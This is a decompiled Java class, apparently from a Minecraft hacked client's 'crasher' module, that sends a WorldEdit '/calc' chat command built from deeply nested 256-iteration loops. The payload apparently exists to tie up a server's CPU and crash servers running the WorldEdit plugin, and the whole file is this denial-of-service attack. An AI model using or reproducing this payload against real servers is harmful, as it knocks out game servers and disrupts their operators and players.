// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.wec;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.client.Minecraft;

public class WorldEditCrasher1
{
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/worldedit:/calc for{7i=o,i<256;i++}{for[b=0;b<256;b++]{for[h=0;h<256;h++]{for[h=0;h<256;h++]{for[n=0;n<256;n++]{}}]}"));
    }
}
